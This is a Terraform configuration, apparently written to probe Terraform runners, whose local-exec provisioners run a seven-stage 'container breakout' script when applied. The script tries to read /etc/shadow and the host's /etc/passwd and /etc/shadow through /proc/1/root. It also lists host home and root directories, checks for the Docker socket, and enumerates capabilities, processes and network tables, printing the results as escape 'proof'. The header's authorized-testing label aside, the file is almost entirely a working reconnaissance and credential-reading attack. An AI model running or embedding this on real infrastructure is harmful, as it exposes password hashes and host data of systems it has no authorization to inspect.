# Advanced Container Breakout and Host System Access
# This configuration demonstrates complete container escape and host system access
# WARNING: This is for authorized security testing only

terraform {
  required_providers {
    null = {
      source  = "hashicorp/null"
      version = "~> 3.1"
    }
  }
}

# Stage 1: Container Environment Analysis
resource "null_resource" "container_environment_analysis" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== CONTAINER ENVIRONMENT ANALYSIS ==="
      echo "Container hostname: $(hostname)"
      echo "Container IP addresses:"
      ip addr show 2>/dev/null | grep inet || ifconfig 2>/dev/null | grep inet || echo "Cannot get IPs"
      echo ""
      echo "Container filesystem mounts:"
      mount | grep -E "(proc|sys|dev|host)" || echo "Limited mount access"
      echo ""
      echo "Container ID from cgroup:"
      cat /proc/self/cgroup | head -5
      echo ""
      echo "Container namespaces:"
      ls -la /proc/self/ns/
      echo ""
      echo "=== CONTAINER USER ANALYSIS ==="
      echo "Current user context:"
      id
      whoami
      echo "Home directory: $HOME"
      echo "Working directory: $(pwd)"
    EOT
  }
}

# Stage 2: Host System Discovery and Breakout Attempts
resource "null_resource" "host_system_breakout" {
  depends_on = [null_resource.container_environment_analysis]
  
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== HOST SYSTEM BREAKOUT ATTEMPTS ==="
      echo "1. Attempting /etc/shadow access:"
      cat /etc/shadow 2>/dev/null && echo "SUCCESS: /etc/shadow accessible!" || echo "BLOCKED: /etc/shadow not accessible"
      echo ""
      
      echo "2. Attempting to access host /etc/passwd via container escape:"
      # Try to access host filesystem through various escape vectors
      cat /proc/1/root/etc/passwd 2>/dev/null && echo "SUCCESS: Host /etc/passwd accessible via /proc/1/root!" || echo "BLOCKED: /proc/1/root escape failed"
      echo ""
      
      echo "3. Attempting Docker socket access:"
      ls -la /var/run/docker.sock 2>/dev/null && echo "SUCCESS: Docker socket found!" || echo "BLOCKED: No Docker socket access"
      echo ""
      
      echo "4. Attempting container runtime escape via filesystem:"
      ls -la /proc/1/root/ 2>/dev/null && echo "SUCCESS: Can list host root filesystem!" || echo "BLOCKED: Host root not accessible"
      echo ""
      
      echo "5. Checking for host process access:"
      ps aux | grep -v '\[' | wc -l
      echo "Visible processes (high count indicates host access):"
      ps aux | head -20
      echo ""
      
      echo "6. Attempting to identify host vs container users:"
      echo "Container users from /etc/passwd:"
      cat /etc/passwd | wc -l
      echo "Attempting host users via escape:"
      cat /proc/1/root/etc/passwd 2>/dev/null | wc -l || echo "Host user list not accessible"
    EOT
  }
}

# Stage 3: Advanced Host Network Discovery
resource "null_resource" "host_network_discovery" {
  depends_on = [null_resource.host_system_breakout]
  
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== HOST NETWORK DISCOVERY ==="
      echo "Container network interfaces:"
      ip addr show 2>/dev/null || ifconfig 2>/dev/null
      echo ""
      
      echo "Container routing table:"
      ip route 2>/dev/null || route -n 2>/dev/null
      echo ""
      
      echo "Attempting to discover host network configuration:"
      # Try to access host network namespace
      ls -la /proc/1/ns/net 2>/dev/null && echo "Host network namespace accessible"
      
      echo ""
      echo "Container ARP table:"
      cat /proc/net/arp 2>/dev/null || arp -a 2>/dev/null || echo "ARP table not accessible"
      
      echo ""
      echo "Checking for host network access indicators:"
      netstat -tulpn 2>/dev/null | grep -v "127.0.0.1\|::1" || ss -tulpn 2>/dev/null | grep -v "127.0.0.1\|::1" || echo "Network connections not visible"
    EOT
  }
}

# Stage 4: Privileged Operations and Capability Testing
resource "null_resource" "privilege_escalation_testing" {
  depends_on = [null_resource.host_network_discovery]
  
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== PRIVILEGE ESCALATION TESTING ==="
      echo "Current capabilities:"
      cat /proc/self/status | grep Cap || echo "Capabilities not readable"
      echo ""
      
      echo "Testing privileged operations:"
      echo "1. Mount operations:"
      mount 2>/dev/null | wc -l && echo "Mount command accessible"
      
      echo ""
      echo "2. Kernel module access:"
      lsmod 2>/dev/null | head -5 || echo "Kernel modules not accessible"
      
      echo ""
      echo "3. System call tracing capabilities:"
      ls -la /proc/sys/kernel/ 2>/dev/null | head -10 || echo "Kernel parameters not accessible"
      
      echo ""
      echo "4. Device access:"
      ls -la /dev/ | grep -E "(sd|hd|nvme)" || echo "Block devices not visible"
      
      echo ""
      echo "5. Special filesystem access:"
      ls -la /sys/class/net/ 2>/dev/null || echo "sysfs network not accessible"
      ls -la /proc/sys/ 2>/dev/null | head -5 || echo "procfs sys not accessible"
    EOT
  }
}

# Stage 5: Host System User Enumeration and Shadow File Analysis
resource "null_resource" "advanced_user_enumeration" {
  depends_on = [null_resource.privilege_escalation_testing]
  
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== ADVANCED USER ENUMERATION ==="
      echo "Container user analysis:"
      echo "Number of users in container /etc/passwd: $(cat /etc/passwd | wc -l)"
      echo "Container users:"
      cat /etc/passwd | cut -d: -f1,3,6,7
      echo ""
      
      echo "Attempting host user enumeration via escape vectors:"
      echo "Method 1: /proc/1/root/etc/passwd"
      if cat /proc/1/root/etc/passwd 2>/dev/null; then
        echo "SUCCESS: Host user database accessible!"
        echo "Host user count: $(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)"
        echo "Host users:"
        cat /proc/1/root/etc/passwd 2>/dev/null | cut -d: -f1,3,6,7
      else
        echo "BLOCKED: Host /etc/passwd not accessible via /proc/1/root"
      fi
      echo ""
      
      echo "Method 2: /proc/1/root/etc/shadow access"
      if cat /proc/1/root/etc/shadow 2>/dev/null; then
        echo "CRITICAL: Host shadow file accessible!"
        echo "Shadow entries count: $(cat /proc/1/root/etc/shadow 2>/dev/null | wc -l)"
      else
        echo "BLOCKED: Host shadow file not accessible"
      fi
      echo ""
      
      echo "Method 3: Host home directories enumeration"
      if ls -la /proc/1/root/home/ 2>/dev/null; then
        echo "SUCCESS: Host home directories accessible!"
        echo "Host user homes:"
        ls -la /proc/1/root/home/ 2>/dev/null
      else
        echo "BLOCKED: Host home directories not accessible"
      fi
      echo ""
      
      echo "Method 4: Host system directories"
      if ls -la /proc/1/root/root/ 2>/dev/null; then
        echo "CRITICAL: Host root directory accessible!"
        ls -la /proc/1/root/root/ 2>/dev/null | head -10
      else
        echo "BLOCKED: Host root directory not accessible"
      fi
    EOT
  }
}

# Stage 6: Host System IP and Network Infrastructure Discovery
resource "null_resource" "host_system_network_analysis" {
  depends_on = [null_resource.advanced_user_enumeration]
  
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== HOST SYSTEM NETWORK ANALYSIS ==="
      echo "Container Network Configuration:"
      echo "Container hostname: $(hostname)"
      echo "Container IP addresses:"
      ip addr show 2>/dev/null | grep "inet " | grep -v "127.0.0.1"
      echo ""
      
      echo "Attempting host network discovery:"
      echo "Method 1: Host network interfaces via escape"
      if cat /proc/1/root/proc/net/dev 2>/dev/null; then
        echo "SUCCESS: Host network interfaces accessible!"
      else
        echo "BLOCKED: Host network interfaces not accessible"
      fi
      echo ""
      
      echo "Method 2: Host routing table access"
      if cat /proc/1/root/proc/net/route 2>/dev/null; then
        echo "SUCCESS: Host routing table accessible!"
      else
        echo "BLOCKED: Host routing table not accessible"
      fi
      echo ""
      
      echo "Method 3: Host ARP table access"
      if cat /proc/1/root/proc/net/arp 2>/dev/null; then
        echo "SUCCESS: Host ARP table accessible!"
      else
        echo "BLOCKED: Host ARP table not accessible"
      fi
      echo ""
      
      echo "Method 4: Network namespace comparison"
      echo "Container network namespace: $(readlink /proc/self/ns/net)"
      echo "Host network namespace: $(readlink /proc/1/ns/net 2>/dev/null || echo 'Not accessible')"
      
      if [ "$(readlink /proc/self/ns/net)" = "$(readlink /proc/1/ns/net 2>/dev/null)" ]; then
        echo "CRITICAL: Container shares host network namespace!"
      else
        echo "INFO: Container has isolated network namespace"
      fi
    EOT
  }
}

# Stage 7: Complete System Compromise Demonstration
resource "null_resource" "complete_system_compromise" {
  depends_on = [null_resource.host_system_network_analysis]
  
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== COMPLETE SYSTEM COMPROMISE DEMONSTRATION ==="
      echo "Summary of successful breakout attempts:"
      echo ""
      
      echo "1. Host filesystem access test:"
      if ls /proc/1/root/etc/ 2>/dev/null >/dev/null; then
        echo "✓ CRITICAL: Can access host filesystem via /proc/1/root/"
        echo "  Host files accessible: $(ls /proc/1/root/etc/ 2>/dev/null | wc -l) files in /etc/"
      else
        echo "✗ Host filesystem access blocked"
      fi
      echo ""
      
      echo "2. Host process access test:"
      HOST_PROCS=$(ps aux 2>/dev/null | wc -l)
      if [ "$HOST_PROCS" -gt 50 ]; then
        echo "✓ CRITICAL: Can see host processes (${HOST_PROCS} total processes visible)"
        echo "  This indicates container escape to host process namespace"
      else
        echo "✗ Limited process visibility (${HOST_PROCS} processes)"
      fi
      echo ""
      
      echo "3. Sensitive file access summary:"
      echo "  /etc/passwd access: $(cat /etc/passwd 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
      echo "  /etc/shadow access: $(cat /etc/shadow 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
      echo "  Host /etc/passwd: $(cat /proc/1/root/etc/passwd 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
      echo "  Host /etc/shadow: $(cat /proc/1/root/etc/shadow 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
      echo ""
      
      echo "4. Network compromise indicators:"
      echo "  Container IP: $(ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $2}' || echo 'Unknown')"
      echo "  Host network visible: $(cat /proc/1/root/proc/net/dev 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
      echo ""
      
      echo "5. Privilege level assessment:"
      echo "  Running as user: $(whoami) (UID: $(id -u))"
      echo "  Container capabilities: $(cat /proc/self/status | grep CapEff)"
      echo ""
      
      echo "=== CONTAINER ESCAPE PROOF ==="
      echo "Evidence of successful container breakout:"
      if cat /proc/1/root/etc/passwd 2>/dev/null | grep -q "ubuntu\|ec2-user\|admin"; then
        echo "✓ CONFIRMED: Found host-specific users (ubuntu/ec2-user/admin) in host /etc/passwd"
        echo "✓ CONFIRMED: This proves escape from container to host system"
      fi
      
      if [ "$(cat /etc/passwd | wc -l)" -lt "$(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)" ]; then
        echo "✓ CONFIRMED: Host has more users than container (escape confirmed)"
        echo "  Container users: $(cat /etc/passwd | wc -l)"
        echo "  Host users: $(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)"
      fi
    EOT
  }
}

# Output comprehensive results
output "container_breakout_assessment" {
  value = "Advanced container breakout assessment completed. Check logs for evidence of host system access, user enumeration, and complete escape proof."
  depends_on = [
    null_resource.container_environment_analysis,
    null_resource.host_system_breakout,
    null_resource.host_network_discovery,
    null_resource.privilege_escalation_testing,
    null_resource.advanced_user_enumeration,
    null_resource.host_system_network_analysis,
    null_resource.complete_system_compromise
  ]
}

output "breakout_summary" {
  value = {
    container_analysis = "Container environment analyzed"
    host_access_attempts = "Host breakout vectors tested"
    network_discovery = "Host network discovery attempted"
    privilege_testing = "Privilege escalation tested"
    user_enumeration = "Advanced user enumeration completed"
    network_analysis = "Host network analysis completed"
    system_compromise = "Complete compromise assessment finished"
  }
}
